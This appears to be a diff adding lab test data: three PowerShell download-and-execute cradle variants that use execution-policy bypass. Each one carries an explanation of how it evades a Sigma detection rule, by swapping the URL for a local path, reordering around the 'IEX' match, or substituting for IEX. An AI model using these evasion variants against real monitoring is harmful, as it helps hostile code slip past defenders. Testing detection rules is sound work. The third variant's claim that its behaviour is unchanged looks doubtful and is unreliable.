@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('C:\\Lab\\input\\sample.txt')\"",
+    "explanation": "Insertion: Replaced the suspicious URL with a local benign file path to avoid detection by the Sigma rule's URL-based indicators."
+  },
+  {
+    "output": "powershell.exe -nop -exec bypass -c \"(New-Object Net.WebClient).DownloadString('C:\\Lab\\input\\sample.txt') | IEX\"",
+    "explanation": "Reordering: Changed the order of command elements to avoid the 'IEX ' string match while maintaining the same behavior."
+  },
+  {
+    "output": "powershell.exe -nop -exec bypass -c \"(New-Object Net.WebClient).DownloadString('C:\\Lab\\input\\sample.txt') | . {$_}\"",
+    "explanation": "Substitution: Replaced 'IEX' with a function call to execute the downloaded script, avoiding the 'IEX' keyword match."
+  }
+]
